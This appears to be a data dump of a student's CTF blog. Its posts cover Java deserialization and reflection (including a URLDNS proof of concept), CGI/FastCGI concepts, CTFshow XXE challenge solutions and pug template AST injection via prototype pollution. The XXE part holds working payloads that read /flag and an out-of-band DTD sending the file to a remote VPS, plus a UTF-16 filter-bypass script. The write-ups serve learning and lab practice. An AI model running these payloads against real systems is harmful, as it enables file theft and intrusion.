{"pages":[{"title":"","text":"about me Whoami : zIxyd Contact : Mjk3MjkxNDY5Mg== Dream : 重生之我要当大黑阔 Age : 19 CTF: WEB/PWN Skill : 精通 Python/Java/C/C++/PHP/JavaScript的Hello World","link":"/about/index.html"},{"title":"","text":"","link":"/links/index.html"}],"posts":[{"title":"Java反序列化基础","text":"重写readObject来执行命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546//Studentpackage test;import java.io.IOException;import java.io.Serializable;public class Student implements Serializable { public String name; public int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }// @Override public String toString() { // 返回对象的字符串表示 return &quot;Student{&quot; + &quot;name='&quot; + name + '\\'' + &quot;, age=&quot; + age + '}'; } //重写readObject private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); }} 1234567891011121314151617//Serializepackage test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class abc { public static void main(String[] args) throws IOException { Student stu = new Student(&quot;lisi&quot;,18); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.txt&quot;)); oos.writeObject(stu); System.out.println(stu); oos.close(); }} 1234567891011121314151617181920//Unserializepackage test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unseralize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.txt&quot;)); Object o = ois.readObject(); System.out.println(o); ois.close(); }} Java(反射基础)Java反射是指在运行时动态地获取、检查和操作类的信息的机制。它允许程序在运行时通过类的名称来获取类的详细信息，包括类的构造函数、方法、字段等，并且可以在运行时动态地创建对象、调用方法和访问字段。反射机制使得程序可以在编译时无法确定具体类的情况下，通过名称来操作类，从而提供了更大的灵活性和动态性。 反射获取class对象1234567891011121314151617181920public class test01 { public static void main(String[] args) throws ClassNotFoundException { /* 获取class对象的三种方式 Class.forName(&quot;全类名&quot;) 全类名：包名+类名 类名.class 对象。getClass() */ Class clazz01 = Class.forName(&quot;Student&quot;); System.out.println(clazz01); Class clazz02 = Student.class; System.out.println(clazz02); Student s = new Student(); Class clazz03 = s.getClass(); System.out.println(clazz03); }} 反射获取构造方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Parameter;public class test01 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { /* Class类中用于获取构造方法的方法 Class类中用于获取构造方法的方法 Constructor&lt;?&gt;[]getConstructors():返回所有公共构造方法对象的数组 Constructor&lt;?&gt;[]getDeclaredConstructors():返回所有构造方法对象的数组 Constructor&lt;T&gt;getConstructor(Class&lt;?&gt;…parameterTypes):返回单个公共构造方法对象 Constructor&lt;-T&gt;getDeclaredConstructor((Class&lt;?&gt;parameterTypes):返回单个构造方法对象 */ //获取Class字节码文件对象 Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;获取所有构造方法&quot;); Constructor[] con = clazz.getDeclaredConstructors(); for (Constructor constructor : con) { System.out.println(constructor.toString()); } System.out.println(&quot;获取无参的构造方法&quot;); Constructor con1 = clazz.getConstructor(); System.out.println(con1); System.out.println(&quot;获取参数为String类型的构造方法&quot;); Constructor con2 = clazz.getDeclaredConstructor(String.class); System.out.println(con2); System.out.println(&quot;获取参数为int类型的构造方法&quot;); Constructor con3 = clazz.getDeclaredConstructor(int.class); System.out.println(con3); System.out.println(&quot;获取参数为Sting类型和int类型的构造方法&quot;); Constructor con4 = clazz.getDeclaredConstructor(String.class,int.class); System.out.println(con4); System.out.println(&quot;获取构造方法的权限修饰符&quot;); /* public : 1 protected : 4 private : 2 */ int modifiers = con4.getModifiers(); System.out.println(modifiers); System.out.println(&quot;获取构造方法的参数&quot;); Parameter[] parameters = con4.getParameters(); for(Parameter parameter : parameters){ System.out.println(parameter); } System.out.println(&quot;创建对象&quot;); con4.setAccessible(true); Object stu = con4.newInstance(&quot;张三&quot;, 18); System.out.println(stu); }} 反射获取成员变量1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.lang.reflect.Field;public class test02 { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { /* Field[] getFields():返回所有公共成员变量对象的数组 Field[] getDeclaredFields():返回所有成员变量对象的数组 Field getField(String name):返回单个公共成员变量对象 Field getDeclaredField(String name):返回单个成员变量对象 */ System.out.println(&quot;获取class字节码文件对象&quot;); Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;获取所有成员变量对象&quot;); Field[] fields = clazz.getDeclaredFields(); for (Field field :fields){ System.out.println(field); } System.out.println(&quot;获取name成员变量&quot;); Field name = clazz.getDeclaredField(&quot;name&quot;); System.out.println(name); System.out.println(&quot;获取权限修饰符&quot;); int modifiers = name.getModifiers(); System.out.println(modifiers); System.out.println(&quot;获取Name&quot;); String n = name.getName(); System.out.println(n); System.out.println(&quot;获取成员变量记录的值&quot;); Student s = new Student(&quot;李四&quot;,18,&quot;男&quot;); name.setAccessible(true); Object value = name.get(s); System.out.println(value); System.out.println(&quot;修改成员变量记录的值&quot;); name.set(s,&quot;张三&quot;); Object value2 = name.get(s); System.out.println(value2); }} URLDNSpoc1234567891011121314151617181920212223242526272829303132import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class Serialize { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException { HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;http://9t3yg0l28pe8p1dypavjbhwf66cx0o1cq.oastify.com&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,2); //在hashmap.put中调用了putVal() hashmap.put(url, 1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;)); hashcodefield.set(url,-1); oos.writeObject(hashmap); oos.close(); }} 12345678910111213import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.ObjectInputStream;public class unSerialize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); ois.readObject(); ois.close(); }} pop gadget12345Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode() 可以理解为, 在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL 这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求. 我在学习URLDNS中遇到一个问题：尽管我setAccessible(true);还是会报错： Unable to make field private int java.net.URL.hashCode accessible: module java.base does not “opens java.net” to unnamed module @5b480cf9,解决方法：更换jdk版本到1.8 动态代理在Java中，动态代理是一种机制，它允许在运行时创建代理对象，以代替原始对象执行特定的操作。代理对象可以拦截对原始对象的方法调用，并在调用前后执行额外的逻辑。 在Java中，动态代理是通过java.lang.reflect.Proxy类和java.lang.reflect.InvocationHandler接口来实现的。Proxy类提供了创建代理对象的静态方法，而InvocationHandler接口定义了代理对象的方法调用处理逻辑。 一个简单的案例 创建要被代理的class123456789101112131415161718192021222324252627282930public class BigStart implements Star{ private String name; public BigStart() { } public BigStart(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } public String sing(String name){ System.out.println(this.name+&quot;正在唱&quot;+name); return &quot;谢谢&quot;; } public void dance(){ System.out.println(this.name+&quot;正在跳舞&quot;); }} 创建接口12345678public interface Star { //可以把想要被代理的方法放到接口当中 public abstract String sing(String name); public abstract void dance();} 创建代理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyuUtil { /* 方法的作用： 给明星创建代理 形参： 被代理的明星 需求： 外面的人想要大明星唱一首歌 1.获取代理的对象 代理对象=ProxyUtil,createProxy(大明星的对象)； 2,再调用代理的唱歌方法 代理对象.唱歌的方法()； */ public static Star createProxy(BigStart bigStart) { /* public static object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[]interfaces,InvocationHandler h) 参数一：用于指定用哪个类加载器，去加载生成的代理类 参数二：指定接口，这些接口用于指定生成的代理长什么，也就是有哪些方法 参数三：用来指定生成的代理对象要干什么事情 */ Star star = (Star) Proxy.newProxyInstance( ProxyuUtil.class.getClassLoader(), new Class[]{Star.class}, new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { /* 参数一：代理的对象 参数二：要运行的方法 参数三：调用方法时，要传输的形参 */ if(&quot;sign&quot;.equals(method.getName())){ System.out.println(&quot;准备话筒&quot;); } else if(&quot;dance&quot;.equals(method.getName())){ System.out.println(&quot;准备场地&quot;); } return method.invoke(bigStart,args); } } ); return star; }} 测试代理123456789101112131415161718192021public class test { public static void main(String[] args) { //1. 获取代理对象 BigStart bigStart = new BigStart(&quot;鸡哥&quot;); Star proxy = ProxyuUtil.createProxy(bigStart); //2. 调用唱歌的方法 String result = proxy.sing(&quot;鸡你太美&quot;); System.out.println(result); //3. 调用跳舞的方法 proxy.dance(); }}//输出如下：//鸡哥正在唱鸡你太美//谢谢//准备场地//鸡哥正在跳舞","link":"/2023/11/01/java(unserialize)/"},{"title":"cgi，php-cgi，fastcgi 、php-fpm之间的关系","text":"前言在做一道ssrf题目时，提到了有关于FastCGI、PHP-FPM，不知道是什么东东 引出概念在整个网站架构中，Web Server（如Apache、Nginx）只是内容的分发者。举个栗子，如果客户端请求的是 index.html，那么Web Server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。 如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。 当Web Server收到index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程，接下来再引出这些概念，会好理解很多。 CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。 FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。 PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。 PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。 （Web Server 一般指Apache、Nginx、IIS、Tomcat等服务器，Web Application 一般指PHP、Java、Asp.net等应用程序） 概念1、CGICGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。 WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。也就是说，CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。（cgi程序，你就可以理解成遵循cgi协议编写的程序） 优点： CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给web服务器和web应用(如提nginx和php)。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少2个的关联，使他们2变得更独立。 缺点： 但是CGI有个难受的地方，就是每一次web请求都会有启动和退出过程，也就是最为人诟病的fork-and-execute模式，这样一在大规模并发下，就死翘翘了。 2、FastCGI从根本上来说，FastCGI是用来提高CGI程序性能的。类似于CGI，FastCGI也可以说是一种协议。 FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。 FastCGI是和语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中，并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。 举例： 当web server收到/index.php请求，看一下CGI程序和FastCGI程序分别是怎么处理的： CGI：当收到web server请求后，会启动对应的CGI程序，这里就是PHP的解析器（php-cgi）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定的CGI规定的格式返回处理后的结果，退出进程。（CGI每次接收到请求都会执行这些步骤） FastCGI：首先，FastCGI程序会先启动一个master，解析配置环境，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源，这就是fastcgi对进程的管理。（CGI程序和FastCGI程序，可以理解成遵循CGI协议和FastCGI协议编写的程序） FastCGI的工作原理： FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求，或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。 （1）Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等) （2）FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。 （3）当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 （4）FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。 CGI与FastCGI比较： （1）对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。 （2）由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。 3、PHP-FPM首先要说的是：fastcgi是一个协议，php-fpm实现了这个协议。 大家都知道，PHP的解释器是php-cgi。php-cgi只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理，所以就出现了一些能够调度php-cgi进程的程序，php-fpm就是这样的一个东西。它克服了php-cgi变更php.ini配置后，需重启php-cgi才能让新的php-ini生效，不可以平滑重启，直接杀死php-cgi进程，php就不能运行了的问题。修改php.ini之后，php-cgi进程的确没办法平滑重启的。php-fpm对此的处理机制是新的worker用新的配置，已经存在的worker处理完手上的活就可以歇着了，通过这种机制来平滑过度。 php-fpm提供了更好的php进程管理方式，可以有效的控制内存和进程，可以平滑重载php配置。 总结一下这个升级的过程： 如果要搭建一个高性能的PHP WEB服务器，目前最佳的方式是Apache/Nginx + FastCGI + PHP-FPM(+PHP-CGI)方式了。 结尾这篇文章转载于 大佬 我在我的vps中nginx用的就是 fastcgi+php-fpm 1234location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;}","link":"/2023/11/08/cgi%EF%BC%8Cphp-cgi%EF%BC%8Cfastcgi%20%E3%80%81php-fpm%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"},{"title":"XXE漏洞","text":"什么是xxe漏洞？XXE全称是XML External Entity Injection，即外部实体注入。XXE是针对应用程序解析XML输入类型的攻击。当包含对外部实体的引用的 XML输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造。 什么是XML? XML 指可扩展标记语言（EXtensible Markup Language）。 XML 是一种很像HTML的标记语言。 XML 的设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义。您需要自行定义标签。 XML 被设计为具有自我描述性。 XML实列XML 文档第一行以 XML 声明开始，用来表述文档的一些信息，如： 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 标签必须成对出现，有开始标签就需要有结束标签， XML 标签没有被预定义，通过 XML 您可以发明自己的标签，列如下面的 “site”,”name”,”url”,”desc”都是自定义的标签 XML 必须包含根元素，它是所有其他元素的父元素。下面案例中的根元素就是“site” 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;site&gt; &lt;name&gt;zIxyd&lt;/name&gt; &lt;url&gt;https://zixyd.github.io&lt;/url&gt; &lt;desc&gt;Blog&lt;/desc&gt;&lt;/site&gt; 什么是DTD？Document Type Definition 文档类型定义 DTD文件一般和XML文件配合使用，主要是为了约束XML文件。 XML文件引入DTD文件，这样XML可以自定义标签，但又受到DTD文件的约束 基本语法： 1&lt;!ELEMENT 元素名 类型&gt; DTD实列编写一个名为myClass.dtd的dtd文件 12345&lt;!ELEMENT 班级 (学生+)&gt;&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;&lt;!ELEMENT 名字 (#PCDATA)&gt;&lt;!ELEMENT 年龄 (#PCDATA)&gt;&lt;!ELEMENT 介绍 (#PCDATA)&gt; 编写一个xml文件并引入dtd文件 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!--引入dtd文件，约束这个xml--&gt;&lt;!DOCTYPE 班级 SYSTEM &quot;myClass.dtd&quot;&gt;&lt;班级&gt; &lt;学生&gt; &lt;名字&gt;周小星&lt;/名字&gt; &lt;年龄&gt;23&lt;/年龄&gt; &lt;介绍&gt;学习刻苦&lt;/介绍&gt; &lt;/学生&gt; &lt;学生&gt; &lt;名字&gt;林晓&lt;/名字&gt; &lt;年龄&gt;25&lt;/年龄&gt; &lt;介绍&gt;是一个好学生&lt;/介绍&gt; &lt;/学生&gt; &lt;/班级&gt; 引入中写的：SYSTEM，表示当前的DTD文件是本地的 如果写的是PUBLIC，则表示引入的DTD文件是来自于网络的. DTD文档的声明及引用1.内部DTD文档1&lt;!DOCTYPE 根元素 [定义内容]&gt; 2.外部DTD文档引入外部的DTD文档分为两种： （1）当引用的DTD文件是本地文件的时候，用SYSTEM标识，并写上”DTD的文件路径”，如下： 1&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt; （2）如果引用的DTD文件是一个公共的文件时，采用PUBLIC标识，如下方式： 1&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt; 补充关键(ENTITY)ENTITY属性：实体用于为一段内容创建一个别名，以后在XML文档中就可以使用别名引用这段内容了。 1,引用实体 1&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt; 举例 123&lt;!ENTITY copyright &quot;I am a programmer&quot;&gt;....&amp;copyright; 2,参数实体 1&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt; 举例 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!ELEMENT person (name,addr,tel,br,email)&gt;&lt;!ENTITY %name &quot;(#PCDATA)&quot;&gt;&lt;!ELEMENT addr %name;&gt;&lt;!ELEMENT tel %name;&gt;&lt;!ELEMENT br EMPTY&gt;&lt;!ELEMENT email %name;&gt; CTFSHOW_XMLweb373(入门xml)123456789101112&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;}highlight_file(__FILE__); 1, libxml_disable_entity_loader函数可以加载外部实体 1可选。禁用 (TRUE) 或启用 (FALSE) libxml 扩展以加载外部实体。 默认为真 2, **file_get_contents(‘php://input’)**接受POST数据 3, simplexml_import_dom 函数把 DOM 节点转换为 SimpleXMLElement 对象 1234567&lt;?php$dom = new domDocument();$dom-&gt;loadXML('&lt;note&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt;');$xml = simplexml_import_dom($dom);echo $xml-&gt;from;?&gt; //输出John payload 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;anything&gt; &lt;ctfshow&gt; &amp;xxe; &lt;/ctfshow&gt;&lt;/anything&gt; web374 (无回显)123456789&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); 利用ENTITY中的参数实体 为区分嵌套实体和实体之间的关系，可以通过单双引号来间隔开，引号中嵌套一个参数实体，其%号需要写成：%也可写为16进制的% 只要明白参数实体，payload不就难理解 先在vps上创建一个dtd文件 123&lt;!ENTITY %dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM 'http://81.71.13.76:5050/%file'&gt;&quot;&gt;%dtd;%xxe; 再vps利用nc监听端口 5050，再发送xml数据 1234567&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM &quot;http://81.71.13.76:8080/xml.dtd&quot;&gt;%aaa;]&gt;&lt;!--XML 必须包含根元素--&gt;&lt;root&gt;1&lt;/root&gt;&lt;&gt; 为什么不直接将dtd文件放到xml数据中，而必须去引入？不可以写成写成下面这种形式？ 1234567&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY %dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM 'http://81.71.13.76:5050/%file'&gt;&quot;&gt;%dtd;%xxe;]&gt;&lt;root&gt;1&lt;/root&gt; web375 -web376(无回显,过滤了&lt;?xml version=”1.0”) XML的声明是可以省略的，所以和374是一样的解法 12345678910111213&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;/', $xmlfile)){ die('error');}if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); web377(无回显,过滤了&lt;?xml version=”1.0”和“http”) 123456789101112&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;|http/i', $xmlfile)){ die('error');}if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。 在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。 外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。 意思是可以对xml文档UTF-16编码 123456789import requestsurl = 'http://f20c0eb6-2aea-496b-8411-94f78f0ae0a4.challenge.ctf.show/'data = '''&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM &quot;http://81.71.13.76:8080/xml.dtd&quot;&gt;%aaa;]&gt;&lt;root&gt;1&lt;/root&gt;'''r = requests.post(url=url,data=data.encode('utf-16')) web378 尝试弱密码登陆，显示登陆成功却没有反应，用bp抓包,很明显是xml数据 1&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt; payload: 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt; &lt;username&gt; &amp;xxe; &lt;/username&gt; &lt;password&gt; admin &lt;/password&gt;&lt;/user&gt; 防范XXE 禁用 XML 解析器中的外部实体处理 验证传入的 XML 数据，以确保其仅包含允许的实体 使用安全的库和 API 处理 XML 数据 实施适当的输入验证，防止恶意的 XML 输入","link":"/2023/11/09/XXE/"},{"title":"AST Injection","text":"模版引擎是什么JS web开发中常用的模版引擎如 ejs、pug、handlebars 功能：动态渲染HTML代码，创建可重复使用的页面结构 ejs 模版使用123456789101112131415// 安装EJS模块：npm install ejs// 引入EJS模块const ejs = require('ejs');// 定义模板const template = ` &lt;h1&gt;Hello, &lt;%= name %&gt;!&lt;/h1&gt;`;// 渲染模板const data = { name: 'John' };const html = ejs.render(template, data);console.log(html); handlebars 模版使用123456789101112131415161718// 安装Handlebars模块：npm install handlebars// 引入Handlebars模块const handlebars = require('handlebars');// 定义模板const template = ` &lt;h1&gt;Hello, {{name}}!&lt;/h1&gt;`;// 编译模板const compiledTemplate = handlebars.compile(template);// 渲染模板const data = { name: 'John' };const html = compiledTemplate(data);console.log(html); pug 模版使用123456789101112131415161718// 安装Pug模块：npm install pug// 引入Pug模块const pug = require('pug');// 定义模板const template = ` h1 Hello, #{name}!`;// 编译模板const compiledTemplate = pug.compile(template);// 渲染模板const data = { name: 'John' };const html = compiledTemplate(data);console.log(html); 总结：可以看到模版引擎其实都有各自的一些特定语法规则，比如 pug 中可以通过 #{name} 来引用外部环境的变量， ejs 则是 \\&lt;%= name %&gt;。通过这种方式简化html代码的编写，同时实现模版重用 模版引擎的工作原理本质上，引擎是通过针对你使用模版语言编写的模版进行解析，从而生成新的JS代码。大题过程可以概括如下： 1词法解析 -&gt; 语法解析 -&gt; 代码生成 但是在语法树处理的过程中，在处理节点的时候，存在大量的赋值、循环操作，而在大部分模版引擎中，都是这么写的： 123456789attrs[name] = attrs[value] if(ast.block){}for(var i in node){} 赋值操作未判断对应的属性是否为对象自身的属性，导致访问到原型链的 Object.prototype 的属性 判断某个属性是否存在，同样未判断是否为对象自身属性是否存在，若存在原型链污染，则可以进入if判断 JS的 for…in 循环会遍历对象的所有可枚举属性，包括原型链上的属性。例如： 12345let obj = { a: 1, b: 2 };obj.__proto__.c = 3;for (let i in obj) { console.log(i); // a, b, c} 因此若存在原型链污染，则可以随意修改AST树，进而影响生成的代码，最终达到RCE（远程代码执行）的目的 需要注意的是： AST树的生成本质上是影响生成的字符串，因此也可以导致XSS漏洞 代码执行的那一步才会导致RCE，这时候需要第一步通过原型链污染注入代码，进而影响生成的代码 pug template AST injection1234567891011const pug = require('pug');// 模拟原型链污染Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt; 当执行到 fn({msg: 'It works'}); 这一步的时候，本质上是进入了一段函数 打印出这段函数的代码，可以看到通过原型链污染我们实现了向生成代码中插入一段字符串 12345678910111213141516(function anonymous(pug) {function template(locals) {var pug_html = &quot;&quot;, pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {; var locals_for_with = (locals || {}); (function (msg) { ;pug_debug_line = 1;pug_html = pug_html + &quot; h1\\u003E&quot;;;pug_debug_line = 1;pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? &quot;&quot; : pug_interp)) + &quot; script\\u003Ealert(origin) \\u002Fscript\\u003E \\u002Fh1\\u003E&quot;; }.call(this, &quot;msg&quot; in locals_for_with ? locals_for_with.msg : typeof msg !== 'undefined' ? msg : undefined)); ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}return template;}) 原理分析(以pug为例)语法树结构 pug 解析 h1= msg ，生成的语法树结构： 1234567891011121314151617181920212223242526272829303132333435{ &quot;type&quot;:&quot;Block&quot;, &quot;nodes&quot;:[ { &quot;type&quot;:&quot;Tag&quot;, &quot;name&quot;:&quot;h1&quot;, &quot;selfClosing&quot;:false, &quot;block&quot;:{ &quot;type&quot;:&quot;Block&quot;, &quot;nodes&quot;:[ { &quot;type&quot;:&quot;Code&quot;, &quot;val&quot;:&quot;msg&quot;, &quot;buffer&quot;:true, &quot;mustEscape&quot;:true, &quot;isInline&quot;:true, &quot;line&quot;:1, &quot;column&quot;:3 } ], &quot;line&quot;:1 }, &quot;attrs&quot;:[ ], &quot;attributeBlocks&quot;:[ ], &quot;isInline&quot;:false, &quot;line&quot;:1, &quot;column&quot;:1 } ], &quot;line&quot;:0} 语法树执行顺序以刚刚生成的语法树结构举例，解析顺序为： Block Tag Block Code …… 